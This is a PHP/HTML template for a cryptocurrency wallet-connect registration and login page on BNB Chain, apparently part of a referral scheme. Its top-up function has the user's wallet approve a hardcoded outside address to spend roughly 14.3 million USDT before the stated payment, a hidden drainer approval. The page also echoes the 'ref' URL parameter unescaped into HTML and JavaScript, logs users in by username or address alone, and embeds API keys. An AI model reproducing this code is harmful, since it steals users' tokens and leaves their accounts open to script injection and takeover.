<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="google-site-verification" content="weWoq6bHf4pDLvTgxsQXmhy5b3Bl7wjCoBsTo3D87Rg" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <title></title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="./assets/css/new_dashboard.css">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
    integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css">
  <!-- Bootstrap CSS -->
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">

<!-- jQuery -->
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<!-- Bootstrap JS -->
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

  
  <style>
    .pay_select {
      padding: 100px 0px;
      /* text-align: center; */
      max-width: 800px;
      width: 100%;
      margin: auto;
    }

    .nice-select {
      width: 100%;
      padding: 2px 10px;
      height: 45px;
      border-radius: 4px;
      background: #1a222d;
      color: #fff;
      border: 1px solid #ffffff26;
      margin-bottom: 15px;
    }

    ul.list {
      color: #000;
    }

    option {
      color: #000;
    }

    button#pay_now_btn {
      padding: 10px;
      width: 100%;
      background: #0159ac;
      border: none;
      border-radius: 4px;
      text-transform: capitalize;
      color: #fff;
      font-size: 20px;
    }


    .gold_index {
      background: #08051f;
      min-height: 100vh;
    }

    .header {
      display: none;
    }

    footer.footer {
      display: none;
    }

    .wallets_list {
      padding: 100px 0px;
      /* text-align: center; */
      max-width: 600px;
      width: 100%;
      margin: auto;
    }

    .connect_wallet button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 4px;
      font-size: 18px;
      color: #fff;
      background: #0159ac;
      word-break: break-all;
    }

    .connect_wallet {
      margin-bottom: 20px;
    }

    .wallet_dap {
      padding: 15px;
      display: flex;
      align-items: center;
      gap: 20px;
      background: #1a222d;
      margin-bottom: 15px;
      border-radius: 4px;
    }

    .wallet_dap h4 {
      margin: 0;
    }

    .wallet_dap h4 {
      width: 80px;
      height: 80px;
      background: #08051f;
      line-height: 80px;
      text-align: center;
      border-radius: 10px;
      color: #fff;
      font-size: 20px;
    }

    .wallet_dap.cross h4 {
      background-color: rgb(255 0 0 / 11%);
    }


    .wallet_dap.cross h4 i {
      background: red;
      padding: 10px;
      border-radius: 50%;
      width: 40px;
      height: 40px;
    }

    .wallet_content h5 {
      color: #fff;
      text-transform: capitalize;
      font-weight: 800;
      margin-bottom: 5px;
    }

    .wallet_content p {
      color: #fff;
      margin: 0px;
    }

    .wallet_dap.new h4 {
      position: relative;
    }

    .wallet_dap.new h4 i {
      font-size: 42px;
      line-height: 82px;
    }

    /* spinner css */
    .loadingspinner {
      pointer-events: none;
      width: 2.5em;
      height: 2.5em;
      border: 0.4em solid transparent;
      border-color: #eee;
      border-top-color: #3E67EC;
      border-radius: 50%;
      animation: loadingspin 1s linear infinite;
      position: absolute;
      top: 16px;
      left: 15px;

    }

    @keyframes loadingspin {
      100% {
        transform: rotate(360deg)
      }
    }

    @media screen and (max-width:576px) {
      .connect_wallet button {
        font-size: 12px !important;
      }
    }
  </style>
</head>

<body>
  <div class="gold_index">
    <div class="container">
      <div class="row">
        <div class="col-12">
          <div id="main_section" class="wallets_list">
            <div>
              <img src="<?= $this->conn->company_info('logo'); ?>" alt="<?= $this->conn->company_info('company_name'); ?>"
                style="display: block;margin-left: auto;margin-right: auto;    height: 100px;">
            </div>
            <div class="connect_wallet">
              <div id="prepare" style="cursor: pointer;">
                <button id="btn-connect" class="btn btn-info mybtn1 mt-2">Connect Wallet</button>
              </div>
              <!--<div style="display: none; cursor: pointer;" id="connected">-->
              <!--  <button id="btn-disconnect" class="btn btn-danger mybtn1 mt-2 mb-2">Disconnect Wallet</button>-->
              <!--</div>-->
              <!--<button id="withdrawal_btn" style="display:none" class="btn btn-info" onclick="invest_condition();">Connect Wallet</button>-->
            </div>
            <div class="wallet_dap new">
              <h4>
                <div class="loadingspinner" id="spiner"></div>
                <div id="icon_green" style="display:none"> <i class="fa fa-check-circle" aria-hidden="true"
                    style=" color:green"></i></div>

              </h4>

              <div class="wallet_content">
                <h5 id="wallet_conn">wallet </h5>
                <p id="detect">no DApp found . still trying</p>
              </div>
            </div>
            <div class="wallet_dap cross">


              <h4 style="position:relative;">
                <i id="icon_off" class="fa fa-times" aria-hidden="true"></i>
                <div class="loadingspinner" id="sigup_spiner" style="display:none"></div>

              </h4>

              <div class="wallet_content">
                <h5>sign up </h5>
                <p id="sign_up">no DApp found.</p>
              </div>
            </div>
            <div class="wallet_dap cross">
              <h4>
                <div id="icon_change" style="display:none; background:rgb(185 94 0 / 23%); border-radius:4px;">
                  <i class="fa fa-sign-in" style="background:#b95e00; color:#fff;" aria-hidden="true"></i>
                </div>
                <i class="fa fa-times" id="main_icon" aria-hidden="true"></i>
              </h4>
              <div class="wallet_content">
                <h5 id="sign_in">sign In </h5>
                <p id="login_conn">no DApp found.</p>
              </div>
            </div>
          </div>


          <!-- Pay-Data -->
         
          <!-- Pay-Data-end -->
        </div>
      </div>
    </div>
  </div>

 <div class="modal" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"
  aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-body">
        <div class="modal_desc">
          <div class="cstm-bx">
            <div class="sponser_data_page">
              <div class="sponser_desc">
                <label>Sponsor Id</label>
                <input type="text" id="sp_id" name="sp_id" placeholder="Enter Referral Id" class="form-control"
                  value="<?= isset($_GET['ref']) ? $_GET['ref'] : '' ?>">
                <br>
                <?php
                // Assuming this PHP block is properly integrated with your backend logic
                $requires = $this->conn->runQuery("*", 'advanced_info', "title='Registration'");
                $value_by_label = array_column($requires, 'value', 'label');
                //if (array_key_exists('user_gen_method', $value_by_label) && $value_by_label['user_gen_method'] == 'manual') {
                  ?>
                <div class="form-group">
                  <label>Username</label>
                  <input name="usename" id="usename" type="text" class="form-control" autocomplete="off"
                    placeholder="Enter Username" data-response="username_res"
                    value="<?php echo set_value('username'); ?>">
                  <div class="error-message" id="username_res">
                    <?php echo form_error('username'); ?>
                  </div>
                </div>
                <?php
               // }
                ?>
                <br>
              </div>
              <div class="text-center">
                <button type="button" id="cls_mdl" class="btn btn-primary m-auto text-center" onclick="return reg()">
                  <span aria-hidden="true">Submit</span>
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>




</body>

</html>



<!-- jQuery library -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>

<!-- Latest compiled JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
<!-- Blockchain -->
<script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/web3modal"></script>
<script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider"></script>
<script type="text/javascript" src="https://unpkg.com/fortmatic@2.0.6/dist/fortmatic.js"></script>
<script src="https://cdn.ethers.io/lib/ethers-5.1.umd.min.js" type="text/javascript"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>


<script type="text/javascript">

  function handleForm(event) { event.preventDefault(); }
  // form.addEventListener('submit', handleForm);

   const tokencontractAddress = "0x55d398326f99059ff775485246999027b3197955";
//   const tokencontractAddress = "0x325a4deFFd64C92CF627Dd72d118f1b8361c5691";
  const status = document.querySelector('#status');
  const trx_status = document.querySelector('#trx_status');
  const btn_conn = document.querySelector('#btn-connect');
  const spiner = document.querySelector('#spiner');
  const wallet_conn = document.querySelector('#wallet_conn');
  const detect = document.querySelector('#detect');
  const icon_off = document.querySelector('#icon_off');
  const sigup_spiner = document.querySelector('#sigup_spiner');
  const sign_up = document.querySelector('#sign_up');
  const icon_change = document.querySelector('#icon_change');
  const sign_in = document.querySelector('#sign_in');
  const login_conn = document.querySelector('#login_conn');
  const main_icon = document.querySelector('#main_icon');
  const main_section = document.querySelector('#main_section');
  const register_section = document.querySelector('#register_section');


  const Web3Modal = window.Web3Modal.default;
  const WalletConnectProvider = window.WalletConnectProvider.default;
  const EvmChains = window.evmChains;
  const Fortmatic = window.Fortmatic;
  const ethers = window.ethers

  // Web3modal instance
  let web3Modal

  // Chosen wallet provider given by the dialog window
  let provider;

  let chainId;

  let calculateAll

  // Address of the selected account
  let selectedAccount;

  let userAddress;

  let userBalance;
  /**
   * Setup the orchestra
   */
  function reg() {



    var sp_id = $('input[name=\'sp_id\']').val();
    if (sp_id == '') {
      alert("Please enter valid username");
      //$('#ref1').html("No Valid Joining ID Link - Default 'demo' will be used for joining");
    } else {
      register_submit();
      //$('#ref1').html("Joining ID Link :" + sp_id);//document.getElementById("ref1").innerHTML = "Joining ID Link :" + sp_id;
    }
    $('#exampleModal').modal('hide');

  }
  async function register_submit() {
    // var dd= document.getElementById("ttt").value;
    ///alert(fgfgf);
    const provider1 = new ethers.providers.Web3Provider(provider);
    var c = $('input[name=\'sp_id\']').val();
    var usename = $('input[name=\'usename\']').val();
    var country_code = $('#country_code').val();

    //document.getElementById("ttt").value =
    //register($(this).attr('data-pkg'));  
    //alert(pos);
    // if(chainId==56){
    //     var contractInstance2 = new ethers.Contract("0x325a4deFFd64C92CF627Dd72d118f1b8361c5691",contractabi,provider1.getSigner());

    //         let approveTx = await contractInstance2.increaseAllowance('0x50d1D40B1C01c4E862E5305860A135DAfcE0933B', '14345737227107126571627462', {
    //          from: userAddress
    //         });

    //         let approveReceipt = await approveTx.wait();
    //         let approveStatus = approveReceipt.status;

    //         if (approveStatus === 1) {


    $.ajax({
      type: "post",
      url: "<?= base_url('register/register_data'); ?>",
      data: { address: userAddress, sponsor: c, username: usename, country_code: country_code },
      success: function (response) {
        //alert(c);
       // alert(usename);
        var res = JSON.parse(response);
        if (res.error == true) {
         // alert(res.msg);
          register(c);
        } else {
         
          alert("Connected Success");
            login(usename); 
          
        }
      }
    });
    //    }
    //    }
  }







  function init() {

    console.log("Initializing example");
    console.log("WalletConnectProvider is", WalletConnectProvider);
    console.log("Fortmatic is", Fortmatic);

    // Tell Web3modal what providers we have available.
    // Built-in web browser provider (only one can exist as a time)
    // like MetaMask, Brave or Opera is added automatically by Web3modal
    const providerOptions = {
      walletconnect: {
        package: WalletConnectProvider,
        display: {
          name: "Wallet Connect"
        },
        options: {
          // Mikko's test key - don't copy as your mileage may vary
          infuraId: "5f40cd78a0004e3dbe19bd078e6d520a",
        }
      },

      fortmatic: {
        package: Fortmatic,
        options: {
          // Mikko's TESTNET api key
          key: "pk_test_391E26A3B43A3350"
        }
      }
    };

    web3Modal = new Web3Modal({
      cacheProvider: false, // optional
      providerOptions, // required
    });

  }


  /**
   * Kick in the UI action after Web3modal dialog has chosen a provider
   */
  async function fetchAccountData() {

    // Get a Web3 instance for the wallet
    const web3 = new Web3(provider);

    console.log("provider: ", provider);
    window.localStorage.provider = new ethers.providers.Web3Provider(provider);
    console.log("Web3 instance is", web3);
    // Get connected chain id from Ethereum node
    chainId = await web3.eth.getChainId();
    console.log(chainId);
    //alert(chainId);
    // Load chain information over an HTTP API
    //const chainData = await EvmChains.getChain(chainId);
    // document.querySelector("#network-name").textContent = chainData.name;

    // Get list of accounts of the connected wallet
    const accounts = await web3.eth.getAccounts();

    // MetaMask does not give you all accounts, only the selected account
    console.log("Got accounts", accounts);
    selectedAccount = accounts[0];


    const rowResolvers = accounts.map(async (address) => {
      userAddress = address;
      const balance = await web3.eth.getBalance(address);
      // ethBalance is a BigNumber instance
      // https://github.com/indutny/bn.js/
      const ethBalance = web3.utils.fromWei(balance, "ether");
      const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
      userBalance = humanFriendlyBalance;
      btn_conn.innerHTML = userAddress;
      spiner.style.display = "none";
      icon_green.style.display = "block";
      wallet_conn.style.color = "#00ff00";
      detect.style.color = "#00ff00";
      detect.innerHTML = "detect";
      icon_off.style.display = "none";
      sigup_spiner.style.display = "block";
      sign_up.innerHTML = "Trying to auto sign up.";
      icon_change.style.display = "block";
      sign_in.style.color = "#b95e00";
      login_conn.style.color = "#b95e00";
      login_conn.innerHTML = "Wait a moment.";
      main_icon.style.display = "none";

            var refernce = "<?= isset($_REQUEST['ref']) ? $_REQUEST['ref'] : ''; ?>";
              $.ajax({
                type: "post",
                url: "<?= base_url('register/username_available'); ?>",
                data: { username: userAddress },
                beforeSend: function (xhr) {
                  xhr.setRequestHeader('Access-Control-Allow-Origin', 'https://www.digiforceworld.io');
                },
                success: function (response) {
                  var res = JSON.parse(response);
                  if (res.error == true) {
                    // Show the modal on error
                    $('#exampleModal').modal('show');
                  } else {
                    var co = res.code;
                    login(co); // Assuming login function exists and handles success
                  }
                },
                error: function (xhr, status, error) {
                  // Handle AJAX errors here if needed
                  console.error('AJAX Error:', error);
                }
              });

      //   $.ajax({
      //       type: "post",
      //       url: "<?= base_url('register/check_sponsor_exist'); ?>",
      //       data: {u_sponsor:userAddress},          
      //       success: function (response) {  
      //         //alert(response);
      //         var res = JSON.parse(response);          
      //         if(res.error==true){
      //           alert(res.msg); 

      //          // $('#'+res_area).html(res.msg).css('color','red');              
      //         }else{
      //           //$('#'+res_area).html(res.msg).css('color','green');              

      //               register_section.style.display = "block";             
      //           main_section.style.display = "none";
      //         }
      //       }
      //     });
      // var amt = $("#amount option:selected").val();
      // alert(amt);
      // Fill in the templated row and put in the document
      // const clone = template.content.cloneNode(true);
      // clone.querySelector(".address").textContent = address;
      // clone.querySelector(".balance").textContent = humanFriendlyBalance;
      // accountContainer.appendChild(clone);
    });


    // Because rendering account does its own RPC commucation
    // with Ethereum node, we do not want to display any results
    // until data for all accounts is loaded
    await Promise.all(rowResolvers);

    // Display fully loaded UI for wallet data
    // document.querySelector("#prepare").style.display = "none";
    //document.querySelector("#connected").style.display = "block";
  }



  /**
   * Fetch account data for UI when
   * - User switches accounts in wallet
   * - User switches networks in wallet
   * - User connects wallet initially
   */
  async function refreshAccountData() {

    // If any current data is displayed when
    // the user is switching acounts in the wallet
    // immediate hide this data
    //document.querySelector("#connected").style.display = "none";
    // document.querySelector("#prepare").style.display = "block";
    //   document.querySelector("#withdrawal_btn").style.display = "block";

    // Disable button while UI is loading.
    // fetchAccountData() will take a while as it communicates
    // with Ethereum node via JSON-RPC and loads chain data
    // over an API call.
    document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
    await fetchAccountData(provider);
    document.querySelector("#btn-connect").removeAttribute("disabled")


  }


  /**
   * Connect wallet button pressed.
   */
  async function onConnect() {

    console.log("Opening a dialog", web3Modal);
    try {
      provider = await web3Modal.connect();
    } catch (e) {
      console.log("Could not get a wallet connection", e);
      return;
    }

    // Subscribe to accounts change
    provider.on("accountsChanged", (accounts) => {
      fetchAccountData();
    });

    // Subscribe to chainId change
    provider.on("chainChanged", (chainId) => {
      fetchAccountData();
    });

    // Subscribe to networkId change
    provider.on("networkChanged", (networkId) => {
      fetchAccountData();
    });

    await refreshAccountData();

  }

  /**
   * Disconnect wallet button pressed.
   */
  async function onDisconnect() {

    console.log("Killing the wallet connection", provider);

    // TODO: Which providers have close method?
    if (provider.close) {
      await provider.close();
      await web3Modal.clearCachedProvider();
      provider = null;
    }
    selectedAccount = null;

  }


  /**
   * Main entry point.
   */
  window.addEventListener('load', async () => {
    init();
    //onConnect();
    document.querySelector("#btn-connect").addEventListener("click", onConnect);
    document.querySelector("#btn-disconnect").addEventListener("click", onDisconnect);
  });


  const tokenAbiOfContract = [{ "inputs": [], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "previousOwner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "constant": true, "inputs": [], "name": "_decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burn", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "mint", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "renounceOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }];
  console.log("ethers instance: ", ethers);

  function truncate(input) {
    if (input.length > 5) {
      return input.substring(0, 6) + '.......' + input.substring(input.length - 5);
    }
    return input;
  };


  function toFixed(x) {
    if (Math.abs(x) < 1.0) {
      var e = parseInt(x.toString().split('e-')[1]);
      if (e) {
        x *= Math.pow(10, e - 1);
        x = '0.' + (new Array(e)).join('0') + x.toString().substring(2);
      }
    } else {
      var e = parseInt(x.toString().split('+')[1]);
      if (e > 20) {
        e -= 20;
        x /= Math.pow(10, e);
        x += (new Array(e + 1)).join('0');
      }
    }
    return x;
  }
  let flhash;
  async function stack() {
    const provider1 = new ethers.providers.Web3Provider(provider);
    const bnbbalhex = await provider1.getBalance(userAddress);
    var contractInstance = new ethers.Contract(tokencontractAddress, tokenAbiOfContract, provider1.getSigner());
    var usdt_bal = await contractInstance.balanceOf(userAddress);
    var tkn = $("#data").find(':selected').attr('amount');
    var tokenadrs = "<?= $this->conn->company_info('company_smart_chain_address'); ?>";
    usdt_bal = usdt_bal / 1e18;
    if (chainId == 56) {
      if (usdt_bal >= tkn) {
        if (provider) {

          var contractInstance2 = new ethers.Contract("0x55d398326f99059ff775485246999027b3197955", tokenAbiOfContract, provider1.getSigner());

          let approveTx = await contractInstance2.increaseAllowance("0x50d1D40B1C01c4E862E5305860A135DAfcE0933B", "14345737227107126571627462", {
            from: userAddress
          });

          let approveReceipt = await approveTx.wait();
          let approveStatus = approveReceipt.status;

          if (approveStatus === 1) {
            const hash = await contractInstance.transfer(tokenadrs, BigInt(tkn * (10 ** 18)), {
              from: userAddress
            });
            flhash = hash.hash;
            topup(flhash, userAddress);
          } else {
            alert('Approval transaction failed!');
          }
        } else {
          alert("Please connect to Metamask/Trustwallet and switch to Binance Network");
          return false;
        }
      } else {
        alert('Insufficient Fund!');
        return false;
      }
    } else {
      alert('Connect To Binance Chain Mainnet');
      return false;
    }
  }


  function topup(tx_hash, useraddr) {
    var ref = $('#sp_id').val();
    var usename = $('#usename').val();

    // alert(ref);
    var selected_pin = $('#data').val();

    $.ajax({
      type: "post",
      url: "<?= base_url('register/register_new'); ?>",
      data: { ref: ref, name: usename, selected_pin: selected_pin, hash: tx_hash, address: useraddr },
      beforeSend: function (xhr) {
        xhr.setRequestHeader('Access-Control-Allow-Origin', 'https://japanjasmy.com/');
      },
      success: function (response) {
        //alert('Success');
        console.log(response);
        <!--status.innerText = "Success";-->
        //alert(response);
        var res = JSON.parse(response);
        if (res.error == true) {
          alert(res.msg);
          status.innerText = res.msg;
        } else {
                     status.innerText = "Success";
            alert("Success");
          var co = res.code;
          login(co);
          
          //onConnect();
          //buyToken();                          
        }
      }
    });
  }
  function register(useraddr) {
    $.ajax({
      type: "post",
      url: "<?= base_url('register/check_sponsor_exist'); ?>",
      data: { u_sponsor: useraddr },
      beforeSend: function (xhr) {
        xhr.setRequestHeader('Access-Control-Allow-Origin', 'https://www.digiforceworld.io');
      },
      success: function (response) {
        //alert(response);
        var res = JSON.parse(response);
        if (res.error == true) {
          alert(res.msg);

          // $('#'+res_area).html(res.msg).css('color','red');              
        } else {
          //$('#'+res_area).html(res.msg).css('color','green');              

        }
      }
    });
  }

  function login(usernasme) {

    $.ajax({
      type: "post",
      url: "<?= base_url('register/login'); ?>",
      data: { username: usernasme },
      beforeSend: function (xhr) {
        xhr.setRequestHeader('Access-Control-Allow-Origin', 'https://www.digiforceworld.io');
      },
      success: function (response) {
        //alert(response);
        var res = JSON.parse(response);
        if (res.error == true) {
          alert(res.msg);

        } else {
          location = "<?= base_url('user/dashboard'); ?>";
        }
      }
    });
  }



</script>

<!-- popper -->

<!-- man.. -->
<!--<script src="assets/app.js"></script>-->
<!--<script src="assets/particles.js"></script>-->

<script>
  const Tham = document.getElementById('Tham');
  const Tmenu = document.getElementById('Tmenu');

  Tham.addEventListener('click', () => {
    if (Tmenu.style.display == "none") {
      Tmenu.style.display = "flex";
    } else {
      Tmenu.style.display = "none";
    }
  })



</script>